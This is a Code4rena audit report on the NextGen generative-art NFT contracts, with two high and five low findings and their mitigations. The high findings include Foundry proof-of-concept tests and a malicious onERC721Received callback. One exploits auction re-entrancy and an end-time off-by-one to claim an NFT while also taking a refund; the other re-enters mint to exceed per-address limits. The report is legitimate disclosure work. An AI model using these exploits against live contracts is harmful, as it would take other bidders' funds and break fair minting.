## NextGen
October 2023 (Code4rena)

A platform for minting and auctioning generative art.

| Severity  | Finding    |
| :-------: | :--------- |
| High | [Auction winner can cancel bid and receive refund while successfully claiming NFT](#h-01) |
| High | [Minter can re-enter `NextGenMinterContract.mint` to exceed `maxAllowance`](#h-02) |
| Low  | [When a collection is configured to use `RandomizerNXT`, new mints can be previewed and conditionally reattempted in `onERC721Received`](#l-01) |
| Low  | [Missing checks for randomizer cause minting to fail without explanation if a randomizer has not been added for the collection](#l-02) |
| Low  | [Inadequate checks for empty values in `collectionPhases` (and `collectionData`)](#l-03) |
| Low  | [Some function-level admins can escalate their own roles to drain all funds from `NextGenMinterContract`](#l-04) |
| Low  | [ Airdrop recipient can DoS airdrop by reverting in `onERC721Received`](#l-05) |

---

<a id="h-01"></a>
### High: Auction winner can cancel bid and receive refund while successfully claiming NFT

**Lines of code**

- [AuctionDemo.sol#L105](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L105)
- [AuctionDemo.sol#L125](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L125)

**Vulnerability details**

This attack strings three smaller vulnerabilities together: reentrancy from `_safeTransfer`, off-by-one errors in the `auctionEndTime` checks in `auctionDemo.cancelBid` and `claimAuction`, and a failure to check that the low level refund calls in `AuctionDemo.claimAuction` succeed.

First, the attacker would need to pick a vulnerable collection: one with an `auctionEndTime` that coincides with a new `block.timestamp`. While `block.timestamp` is no longer vulnerable to miner manipulation, valid `block.timestamp` values can now be calculated well in advance. And with a new block reliably mined every twelve seconds, the attacker would likely not need to wait long for a vulnerable auction to occur.

Once an auction with a vulnerable `auctionEndTime` begins, the attacker would need to place a winning bid from a contract with a malicious `onERC721Received` function. With the high bid submitted, they would `claimAuction` at precisely the block coinciding with the `auctionEndTime`. This allows the attacker's malicious contract to call `cancelBid` in its `onERC721Received` callback.

While `claimAuction` checks that an auction has ended by requiring that `block.timestamp` is greater than or equal to the `auctionEndDate`, `cancelBid` checks that an auction has not ended by requiring that `block.timestamp` is less than or equal to the `auctionEndDate`. This means that, for exactly one second, the auction is both concluded and ongoing: a winning bid can be claimed and cancelled at the same time.

```solidity
// auctionDemo.claimAuction L105
require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
```

```solidity
// auctionDemo.cancelBid L125
require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
```

Note that this attack is possible even without the reentrancy — this is just the more efficient path, and it is possibly cheaper as well (if the lower transaction costs adequately offset the cost of deploying the malicious contract, which is more likely to be the case if the attacker intends to exploit more than one auction).

**Impact**

While the auctioning account still gets paid, the last bidder in the array does not get their refund (unless the contract has the funds to cover the attacker's withdrawn bid). If there are multiple auctions happening at the same time, it is also possible that all refunds in the malicious transaction actually succeed, and the problem of the missing funds bubbles up in a later auction. In this scenario, the attack itself might not even be discovered until long after it occurs, if at all, and the attacker is free to continue exploiting vulnerable auctions as they come up.

**Proof of Concept**

```solidity
// Full test can be viewed here: https://gist.github.com/ethanbennett/80d3214274b5572a1b1a11453a46e7eb

contract AuctionReentrancy is NextGenTestBase {
    function test_AuctionReentrancy() external {
        uint256 tokenId;
        address auctioner = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

        // mintAndAuction a new erc721 from NextGenMinter
        vm.warp(1699224249);
        tokenId = _core.viewTokensIndexMin(_collectionId) + _core.viewCirSupply(_collectionId);
        _minter.mintAndAuction(auctioner, "", 0, _collectionId, 1699226465);

        // set allowance so _auction can transfer nft to winner
        // note: this functionality is missing from NextGen contracts
        vm.prank(auctioner);
        _core.approve(address(_auction), tokenId);

        // deploy and fund MaliciousBidder (with arbitrary amount)
        MaliciousBidder attacker = new MaliciousBidder(address(_auction), tokenId);
        vm.deal(address(attacker), 1 ether);

        // store the Bidder's balance for testing
        uint256 etherBalanceBefore = address(attacker).balance;
        uint256 nftBalanceBefore = _core.balanceOf(address(attacker));

        // create the high bid from MaliciousBidder
        attacker.bid();

        // set the block.timestamp to exactly the auction's end time.
        // attacker would need to wait for an auction that ends at the same
        // time as a new block.timestamp
        vm.warp(1699226465);

        // claimAuction from MaliciousBidder and cancelBid inside onERC721Received
        attacker.claim();

        // query balances for final testing
        uint256 etherBalanceAfter = address(attacker).balance;
        uint256 nftBalanceAfter = _core.balanceOf(address(attacker));

        assertEq(etherBalanceBefore, etherBalanceAfter);
        assertGt(nftBalanceAfter, nftBalanceBefore);
    }
}
    
// MaliciousBidder.onERC721Received:
    
function onERC721Received(
    address,
    address,
    uint256,
    bytes calldata
) external returns (bytes4) {
    _auction.cancelBid(_tokenId, 0);
    return IERC721Receiver.onERC721Received.selector;
}
```

**Recommended mitigation**

- Change L105 in `claimAuction` to:

```solidity
require(block.timestamp > minter.getAuctionEndTime(_tokenid) && ( ... ) );
```

- Transfer the auctioned NFT to the winner after tranferring the winnings to the auctioner, or, better yet, after all other payments have been issued. This will adhere to the "checks, effects, interactions" pattern and prevent similar vulnerabilities from emerging here in the future.
- Be sure to `require(success)` for all low-level calls. This alone would have made it much more difficult to exploit an auction successfully.

---

<a id="h-02"></a>
### High: Minter can re-enter `NextGenMinterContract.mint` to exceed `maxAllowance`

**Lines of code**

- [NextGenCore.sol#L193](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L193)

**Vulnerability details**

Every collection has an explicitly defined `maxAllowance`. It will always need to be defined with some degree of thought, because failing to define it at all would give it the default value of 0 and disallow minting in most situations. Considering this, a user bypassing this limit and significantly exceeding the `maxAllowance` presents a significant problem.

Since `NextGenCore.mint` does not update the `tokensMintedPerAddress` until after it mints a new token, an attacker would only need to recursively re-enter `NextGenMinterContract.mint` in its `onERC721Received` function to mint as many tokens as they want. When the minting completes, the balances will update — but with the checks having been done on each loop before minting, the updated `tokensMintedPerAddress` would only matter if the attacker tried to mint again in a subsequent transaction.

**Impact**

The purpose of the novel approaches to minting in this project is to ensure fair and controlled mints for all users. Despite the attacker still paying the defined price for every NFT they purchase, they have still undermined this purpose. And for an extremely successful project in a healthy market, an attacker could gain more than enough ether to cover the initial costs and still profit in secondary markets.

The only upper limits on an attacker's ability to mint are the transaction's `gasLimit` and the collection's `totalSupply`.

**Proof of Concept**

```solidity
// Full test can be viewed here: https://gist.github.com/ethanbennett/a6b3c26ee723ed706f85d3b4c83da530

contract ReMinterancy is NextGenTestBase {
    function test_MintReentrancy() external {
        // deploy and fund malicious minter
        MaliciousMinter attacker = new MaliciousMinter(address(_minter));
        vm.deal(address(attacker), 5 ether);
        
        // balance of attacker is currently 0
        assertEq(_core.balanceOf(address(attacker)), 0);
        
        // the maximum allowance for the collection is 2,
        // so no user should ever gain more than 2 tokens from this function
        assertEq(_core.viewMaxAllowance(_collectionId), 2);

        // reenter `mint` recursively from MaliciousMinter.onERC721Received to exceed
        // maxAllowance before it updates
        vm.warp(1699284249);
        attacker.initialMint(_collectionId);

        // balance of attacker is now 100
        assertEq(_core.balanceOf(address(attacker)), 100);
    }
}
```

**Recommended mitigation**

Simply moving `_mintProcessing` (L193, `NextGenMinterContract.mint`) below the state updates would make this attack impossible:

```solidity
function mint(uint256 mintIndex, address _mintingAddress , address _mintTo, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID, uint256 phase) external {
    require(msg.sender == minterContract, "Caller is not the Minter Contract");
    collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;
    if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {
        if (phase == 1) {
            tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;
        } else {
            tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;
        }
        _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
    }
}
```

---

<a id=l-01></a>
### Low: When a collection is configured to use `RandomizerNXT`, new mints can be previewed and conditionally reattempted in `onERC721Received`

**Lines of code**

- [RandomizerNXT.sol#L58](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerNXT.sol#L58)

**Vulnerability details**

Since `RandomizerNXT` has already set the `tokenHash` by the time Core calls `_safeMint``, users could potentially preview some data about their mint in onERC721Received` before the transaction has completed, then revert and retry if desired. This is low risk, since this would all need to happen programmatically, and metadata and rarity-related attributes should not be available at this point in the minting process. It is possible that some collections might one day set data at the time of minting that can be advantageous to know in advance, though, so it should be patched regardless.

---

<a id=l-02></a>
### Low: Missing checks for randomizer cause minting to fail without explanation if a randomizer has not been added for the collection

**Lines of code**

- [MinterContract.sol#L196](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L196)

**Vulnerability details**

Minting will not succeed unless a randomizer has been added for a collection. But adding a randomizer is only one of many configuration steps for a new collection, and it is separate from all other actions. It is an easy step to miss, but there is no validation that the randomizer has been set before minting. So in cases where it is forgotten, minting fails without a relevant error message.

**Recommended mitigation**

Consider requiring that a collection has a valid randomizer set before attempting to mint a new token.

---

<a id=l-03></a>
### Low:  Inadequate checks for empty values in `collectionPhases` (and `collectionData`)

**Lines of code**

- [MinterContract.sol#L165](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L165)
- [NextGenCore.sol#L157](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L157)

**Vulnerability details**

On L164 of `NextGenMinterContract`, the function updates a boolean called `setMintingCosts` to `true`. It then checks the value of this boolean before it accesses essential values from the `collectionPhases` struct.

There is no validation that any of these parameters are non-null values, however, so `setMintingCosts` does not actually guarantee that any of these values exist. It then goes on to use `collectionPhases.timePeriod` — potentially `0` — as the denominater in the `getPrice` function. This would cause minting with sales option two to fail without a useful error message.

`collectionData` uses the same inadequate check, but none of its values would cause errors in critical functionality if they were zero.

**Recommended mitigation**

Consider adding additional requirements for the unchecked parameters in `setMintingCosts` and `core.setCollectionData`.

---

<a id=l-04></a>
### Low: Some function-level admins can escalate their own roles to drain all funds from `NextGenMinterContract`

**Lines of code**

- [NextGenCore.sol#L322](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L322)
- [MinterContract.sol#L461](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L461)

**Vulnerability details**

At the outset, it must be acknowledged that the NextGen team considers all admin roles to be trusted, and findings related to an admin abusing their defined role are not valid. However, an admin having the ability to escalate their own role unilaterally and execute functionality they were not approved to execute — even if only a malicious admin would exercise this ability — is worth fixing. This is even more true if this vulnerability is exploitable for major monetary gain, as is the case here.

Because the owner of the `NextGenAdmins` contract is treated as a global admin throughout the system, any `FunctionAdmin` with the authority to `updateAdminContract` (L454, `NextGenMinterContract`) can deploy their own admin contract, replace the old one, and drain all the funds from the minter contract by calling `emergencyWithdraw` (L461, `NextGenMinterContract`).

Even considering the team's intent to only use multisigs as admins, the balance of `NextGenMinter` could very easily get high enough to tempt more than one possible attacker. `emergencyWithdraw` is high-impact enough that it should not have any implicitly defined access granted to it. Such caveats are bound to be forgotten or overlooked, especially by future developers who join the NextGen team and external maintainers of forks (such as UNIC at launch).

**Recommended mitigation**

Consider explicitly defining who can access `updateAdminContract` and `emergencyWithdraw`, and under what circumstances. It would also be worthwhile to implement a multi-party approval system for these functions, as seen in `NextGenMinterContract` when proposing addresses and percentages.

---

<a id="l-05"></a>
### Low: Airdrop recipient can DoS airdrop by reverting in `onERC721Received`

**Lines of code**

- [NextGenCore.sol#L182](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L182)

**Vulnerability details**

Since `airdropTokens` iterates an array of airdrop `_recipients` and calls `_safeMint` for each, if any of these iterations reverts, the entire airdrop will fail. This makes it trivially easy for anyone who can secure a spot in an airdrop to execute a denial-of-service attack on the airdrop.

They would need to plan ahead by first deploying a contract with a malicious `onERC721Received` function, and then by doing whatever is required to qualify that contract for an airdrop. The difficulty of achieving this would depend on each collection's approach to putting their list of recipients together — based on similar projects, this could likely be achieved by sending other tokens by the same artist, or other NextGen tokens, to the contract until it is selected lottery-style (like The Memes).

**Recommended mitigation**

Consider using try/catch logic around each `_safeMint`, and emitting an event with relevant details when a mint fails. While not strictly necessary in other contexts, it would have the added benefit of providing the means to monitor failed mints of all kinds more closely.




